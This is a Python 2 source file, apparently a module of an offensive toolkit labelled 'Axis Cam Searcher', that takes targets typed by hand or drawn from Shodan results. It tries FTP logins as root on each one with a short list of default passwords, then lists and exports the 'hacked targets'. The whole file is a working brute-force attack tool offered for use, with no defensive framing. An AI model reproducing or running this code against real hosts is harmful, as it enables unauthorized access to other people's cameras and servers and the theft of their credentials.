# -*- coding: utf-8 -*-
import sys
sys.path.append('.')
from config import config
from tabulate import tabulate
from ftplib import FTP

class module(config):


####Init configuration####
    def __init__(self):
        self.config = config()
        self.cur = self.config.getCursor()
        self.con = self.config.getCon()
        self.targets=[]
        self.dicc=["root", 123456, 1234, 123, "toor", "ftp"]
        self.exploitedTargets = []
        self.preExecution()
##########################

####User define information####
    def preExecution(self):
        while(True):
            option = raw_input("> ")
            if(option=="exit"):
                exit(0)

            if(option=="help"):

                print("set target URL      --> Manual Target")
                print("clear targets       --> Show Targets in module")
                print("show targets        --> Clear Targets in module")
                print("show result         --> Show hacked targets")
                print("export file         --> Export hacked targets to file")
                print("use shodan          --> Targets from Shodan Results")
                print("exploit             --> Start atack")
                print("info                --> Show info of module")
                print("exit                --> Close Module")

            if(option.find("set target")>-1):
                data = option.split(" ")
                target = data[0]
                port = "21"
                self.targets.append((0,target,port,"Manual","null"))

            if(option.find("use shodan")>-1):
                self.targets=self.config.getTargets();

            if(option=="clear targets"):
                self.targets=[]
                print("Clear Done")

            if(option=="show targets"):
                if(len(self.targets)!=0):
                        print tabulate(self.targets, ["id", "IP", "PORT", "Description"], tablefmt="grid")
                else:
                    print "No targets"

            if(option=="show result"):
                for item in self.exploitedTargets:
                    print item

            if(option=="export file"):
                route = raw_input("Set file route: ")
                for item in self.exploitedTargets:
                    if(route!=""):
                        f = open(route,"a")
                        f.write(item+"\n")
                        f.close()
                    else:
                        print "Route path..."
                print "File Export succeful"

            if(option=="info"):
                print "[*] Axis Cam Searcher"
                print "[*] by hdbreaker"

            if(option=="exploit"):
                self.exploit()
###################################

###Exploit c0de###
    def exploit(self):
        if(len(self.targets)!=0):
            for target in self.targets:
                try:
                    ftp=FTP(target[1],timeout=5);
                    print "Trying: %s" % target[1]
                    for passwd in self.dicc:
                        try:
                            print "Trying with pass: %s" % passwd

                            ftp.login("root", "%s" % passwd)
                            print ""
                            print "Get in: "+target[1]+" User: root Pass: "+passwd
                            self.exploitedTargets.append("Target: "+target[1]+" User: root Password: "+passwd)
                            break
                        except:
                            pass
                    print ""
                    ftp.quit()
                except:
                    print "Login FAIL\n"
                ftp.close()
            print "All target has been tested!"

        else:
            print "No targets found";

####def custom user functions (calleable from exploit())####
    def testFunctions(self):
        print "Mi first functions"
#############################################################

#####Init Module#####
start = module()
#####################